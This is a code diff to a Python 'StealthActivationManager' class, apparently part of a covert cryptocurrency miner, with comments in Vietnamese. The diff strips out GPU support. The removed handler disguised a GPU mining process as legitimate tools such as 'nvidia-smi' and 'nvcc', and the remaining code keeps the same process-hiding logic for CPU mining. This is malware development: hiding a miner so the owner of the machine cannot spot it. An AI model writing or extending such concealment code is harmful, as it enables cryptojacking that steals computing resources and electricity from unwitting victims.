@@ -138,9 +138,7 @@ class StealthActivationManager:
             self.event_bus.subscribe('mining:cpu_pid_registered', self._on_cpu_pid_registered)
             self.event_subscriptions.append('mining:cpu_pid_registered')
             
-            # Subscribe to GPU PID registration events  
-            self.event_bus.subscribe('mining:gpu_pid_registered', self._on_gpu_pid_registered)
-            self.event_subscriptions.append('mining:gpu_pid_registered')
+            # CPU-only build: bỏ đăng ký GPU events
             
             self.logger.info(f"✅ [STEALTH-ACTIVATION] EventBus subscriptions active: {len(self.event_subscriptions)} events")
             
@@ -180,37 +178,7 @@ class StealthActivationManager:
         except Exception as e:
             self.logger.error(f"❌ [STEALTH-ACTIVATION] CPU PID handler error: {e}")
     
-    def _on_gpu_pid_registered(self, event_data: Dict[str, Any]):
-        """
-        **[GPU PID Registration Handler]** (xử lý đăng ký PID GPU)
-        
-        Được gọi khi EventBus nhận được 'mining:gpu_pid_registered' event.
-        """
-        try:
-            pid = event_data.get('pid')
-            process_name = event_data.get('process_name', 'inference-cuda')
-            
-            self.logger.info(f"🔔 [STEALTH-ACTIVATION] GPU PID registered: {pid} ({process_name})")
-            
-            # **CRITICAL**: Activate stealth for GPU process  
-            success = self._activate_process_stealth(
-                pid=pid,
-                process_name=process_name, 
-                process_type='GPU',
-                stealth_names=[
-                    "nvidia-smi", "cuda-gdb", "nvcc", "nvidia-ml-py",
-                    "nvidia-settings", "gpu-manager", "glxgears", 
-                    "vulkan-info", "mesa-loader", "drm-tip"
-                ]
-            )
-            
-            if success:
-                self.logger.info(f"✅ [STEALTH-ACTIVATION] GPU process PID {pid} stealth activated")  
-            else:
-                self.logger.error(f"❌ [STEALTH-ACTIVATION] GPU process PID {pid} stealth activation failed")
-                
-        except Exception as e:
-            self.logger.error(f"❌ [STEALTH-ACTIVATION] GPU PID handler error: {e}")
+    # CPU-only build: handler GPU bị loại bỏ
     
     def _activate_process_stealth(self, pid: int, process_name: str, process_type: str, stealth_names: List[str]) -> bool:
         """
